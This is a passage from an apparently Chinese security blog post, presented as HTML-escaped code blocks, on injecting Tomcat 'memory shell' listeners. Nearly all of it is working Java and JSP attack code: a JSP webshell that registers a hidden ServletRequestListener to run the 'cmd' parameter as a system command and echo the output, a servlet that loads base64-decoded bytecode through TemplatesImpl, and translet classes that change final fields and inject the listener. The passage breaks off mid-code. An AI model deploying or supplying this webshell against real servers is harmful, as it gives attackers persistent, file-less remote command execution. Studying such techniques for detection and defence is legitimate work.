class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.List&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.Arrays&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.connector.RequestFacade&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    class Testlistener implements ServletRequestListener &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\">            RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                Field requestf=test.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class=\"line\">                requestf.setAccessible(true);</span><br><span class=\"line\">                Request request= (Request) requestf.get(test);</span><br><span class=\"line\">                Response response=request.getResponse();</span><br><span class=\"line\"></span><br><span class=\"line\">                String cmd=request.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">                System.out.println(cmd);</span><br><span class=\"line\">                if(cmd!=null)&#123;</span><br><span class=\"line\">                    InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+cmd).getInputStream();</span><br><span class=\"line\">                    ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                    byte[] b = new byte[1024];</span><br><span class=\"line\">                    int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                    while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                        baos.write(b, 0, a);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                    response.getWriter().write(new String(baos.toByteArray()));</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; catch (NoSuchFieldException | IllegalAccessException | IOException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    //获取StandardContext</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\">    </span><br><span class=\"line\">    //注入listener</span><br><span class=\"line\">    Object[] objects = standardContext.getApplicationEventListeners();</span><br><span class=\"line\">    List&lt;Object&gt; listeners = Arrays.asList(objects);</span><br><span class=\"line\">    List&lt;Object&gt; listenerList = new ArrayList(listeners);</span><br><span class=\"line\">    listenerList.add(new Testlistener());</span><br><span class=\"line\">    standardContext.setApplicationEventListeners(listenerList.toArray());</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n<p>可以执行命令并获取回显</p>\n<h3 id=\"动态加载字节码实现内存马注入\"><a href=\"#动态加载字节码实现内存马注入\" class=\"headerlink\" title=\"动态加载字节码实现内存马注入\"></a>动态加载字节码实现内存马注入</h3><p>用反序列化有点麻烦，通常我们反序列化注入内存马也是用加载字节码的方式，所以我这里直接加载字节码方便一点，原理一样的。</p>\n<p>测试demo</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"></span><br><span class=\"line\">import javax.servlet.ServletException;</span><br><span class=\"line\">import javax.servlet.http.HttpServlet;</span><br><span class=\"line\">import javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\">import javax.servlet.http.HttpServletResponse;</span><br><span class=\"line\">import javax.xml.transform.TransformerConfigurationException;</span><br><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\">import java.lang.reflect.Field;</span><br><span class=\"line\">import java.util.Base64;</span><br><span class=\"line\"></span><br><span class=\"line\">public class ListenerShell extends HttpServlet&#123;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">        String test=req.getParameter(&quot;test&quot;);</span><br><span class=\"line\">        byte[] bytecode= Base64.getDecoder().decode(test);</span><br><span class=\"line\">        byte[][] bytee= new byte[][]&#123;bytecode&#125;;</span><br><span class=\"line\">        TemplatesImpl templates=new TemplatesImpl();</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            setFildValue(templates,&quot;_bytecodes&quot;,bytee);</span><br><span class=\"line\">            setFildValue(templates,&quot;_name&quot;,&quot;Code&quot;);</span><br><span class=\"line\">            setFildValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class=\"line\">            templates.newTransformer();</span><br><span class=\"line\">        &#125; catch (TransformerConfigurationException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (NoSuchFieldException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">        super.doGet(req, resp);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void setFildValue(Object obj,String name,Object value) throws NoSuchFieldException, IllegalAccessException &#123;</span><br><span class=\"line\">        Field field=obj.getClass().getDeclaredField(name);</span><br><span class=\"line\">        field.setAccessible(true);</span><br><span class=\"line\">        field.set(obj,value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>就是利用 <code>TemplatesImpl</code> 加载字节码，试一下</p>\n<p>现在来编写POC，这里我们还是用之前学的 <code>lastServicedRequest</code> 的方式获取回显，过程还是分为两不</p>\n<ul>\n<li>将 <code>request</code> 和 <code>response</code> 对象分别存放进<code>lastServicedRequest</code> 和 <code>lastServicedResponse</code> 对象</li>\n<li>将 <code>request</code> 从 <code>lastServicedRequest</code>取出，并通过其动态注册恶意 listener</li>\n</ul>\n<p>第一步可以直接用之前的代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class=\"line\">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.lang.reflect.Field;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Echoinject extends AbstractTranslet &#123;</span><br><span class=\"line\">    static &#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            //修改WRAP_SAME_OBJECT的值为true</span><br><span class=\"line\">            Class dispatcher = Class.forName(&quot;org.apache.catalina.core.ApplicationDispatcher&quot;);</span><br><span class=\"line\">            Field WRAP_SAME_OBJECT = dispatcher.getDeclaredField(&quot;WRAP_SAME_OBJECT&quot;);</span><br><span class=\"line\">            WRAP_SAME_OBJECT.setAccessible(true);</span><br><span class=\"line\"></span><br><span class=\"line\">            //修改final变量，否则不能修改final的属性</span><br><span class=\"line\">            Field modifiersField = WRAP_SAME_OBJECT.getClass().getDeclaredField(&quot;modifiers&quot;);</span><br><span class=\"line\">            modifiersField.setAccessible(true);</span><br><span class=\"line\">            modifiersField.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class=\"line\">            if (!WRAP_SAME_OBJECT.getBoolean(null)) &#123;</span><br><span class=\"line\">                WRAP_SAME_OBJECT.setBoolean(null, true);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            //初始化lastServicedRequest</span><br><span class=\"line\">            Class filterchain = Class.forName(&quot;org.apache.catalina.core.ApplicationFilterChain&quot;);</span><br><span class=\"line\">            Field lastServicedRequest = filterchain.getDeclaredField(&quot;lastServicedRequest&quot;);</span><br><span class=\"line\">            modifiersField = lastServicedRequest.getClass().getDeclaredField(&quot;modifiers&quot;);</span><br><span class=\"line\">            modifiersField.setAccessible(true);</span><br><span class=\"line\">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class=\"line\">            lastServicedRequest.setAccessible(true);</span><br><span class=\"line\">            if (lastServicedRequest.get(null) == null) &#123;</span><br><span class=\"line\">                lastServicedRequest.set(null, new ThreadLocal());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            //初始化初始化lastServicedResponse</span><br><span class=\"line\">            Field lastServicedResponse = filterchain.getDeclaredField(&quot;lastServicedResponse&quot;);</span><br><span class=\"line\">            modifiersField = lastServicedResponse.getClass().getDeclaredField(&quot;modifiers&quot;);</span><br><span class=\"line\">            modifiersField.setAccessible(true);</span><br><span class=\"line\">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class=\"line\">            lastServicedResponse.setAccessible(true);</span><br><span class=\"line\">            if (lastServicedResponse.get(null) == null) &#123;</span><br><span class=\"line\">                lastServicedResponse.set(null, new ThreadLocal());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; catch (NoSuchFieldException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>写一下第二步的代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class=\"line\">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class=\"line\">import org.apache.catalina.connector.Request;</span><br><span class=\"line\">import org.apache.catalina.connector.RequestFacade;</span><br><span class=\"line\">import org.apache.catalina.connector.Response;</span><br><span class=\"line\">import org.apache.catalina.core.ApplicationContext;</span><br><span class=\"line\">import org.apache.catalina.core.StandardContext;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.ByteArrayOutputStream;</span><br><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\">import java.io.InputStream;</span><br><span class=\"line\">import java.util.ArrayList;</span><br><span class=\"line\">import java.util.Arrays;</span><br><span class=\"line\">import javax.servlet.ServletContext;</span><br><span class=\"line\">import javax.servlet.ServletRequest;</span><br><span class=\"line\">import javax.servlet.ServletRequestEvent;</span><br><span class=\"line\">import javax.servlet.ServletRequestListener;</span><br><span class=\"line\">import java.lang.reflect.Field;</span><br><span class=\"line\">import java.util.List;</span><br><span class=\"line\"></span><br><span class=\"line\">public class ListenerInject extends AbstractTranslet implements ServletRequestListener &#123;</span><br><span class=\"line\">    static &#123;</span><br><span class=\"line\">        //获取request和response</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Field context= null;</span><br><span class=\"line\">            context = Class.forName(&quot;org.apache.catalina.core.ApplicationFilterChain&quot;).getDeclaredField(&quot;lastServicedRequest&quot;);</span><br><span class=\"line\">            context.setAccessible(true);</span><br><span class=\"line\">            ThreadLocal threadLocal=(ThreadLocal) context.get(null);</span><br><span class=\"line\">            ServletRequest request=null;</span><br><span class=\"line\">            if(threadLocal!=null&amp;&amp;threadLocal.get()!=null)&#123;</span><br><span class=\"line\">                request= (ServletRequest) threadLocal.get();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            if(request!=null)&#123;</span><br><span class=\"line\">                //获取context</span><br><span class=\"line\">                ServletContext servletContext=request.getServletContext();</span><br><span class=\"line\">                if(servletContext!=null)&#123;</span><br><span class=\"line\">                    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">                    appctx.setAccessible(true);</span><br><span class=\"line\">                    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">                    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">                    stdctx.setAccessible(true);</span><br><span class=\"line\">                    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">                    //注入listener</span><br><span class=\"line\">                    Object[] objects = standardContext.getApplicationEventListeners();</span><br><span class=\"line\">                    List&lt;Object&gt; listeners = Arrays.asList(objects);</span><br><span class=\"line\">                    List&lt;Object&gt; listenerList = new ArrayList(listeners);</span><br><span class=\"line\">                    listenerList.add(new ListenerInject());</span><br><span class=\"line\">                    standardContext.setApplicationEventListeners(listenerList.toArray());</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; catch (NoSuchFieldException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\">        RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Field requestf=test.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class=\"line\">            requestf.setAccessible(true);</span><br><span class=\"line\">            Request request= (Request) requestf.get(test);</span><br><span class=\"line\">            Response response=request.getResponse();</span><br><span class=\"line\"></span><br><span class=\"line\">            String cmd=request.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">            System.out.println(cmd);</span><br><span class=\"line\">            if(cmd!=null)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+cmd).getInputStream();</span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                response.getWriter().write(new String(baos.toByteArray()));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; catch (NoSuchFieldException | IllegalAccessException | IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>成功注入，over</p>\n<h3 id=\"另一种动态注入listener的方式\"><a href=\"#另一种动态注入listener的方式\" class=\"headerlink\" title=\"另一种动态注入listener的方式\"></a>另一种动态注入listener的方式</h3><p>我发现有一个<code>addApplicationEventListener</code> 方法，可以直接将对象插进去</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">standardContext.addApplicationEventListener(new Testlistener());</span><br></pre></td></tr></table></figure>\n\n<p>所以我们的jsp马就可以简化成</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.List&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.Arrays&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.connector.RequestFacade&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    class Testlistener implements ServletRequestListener &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span 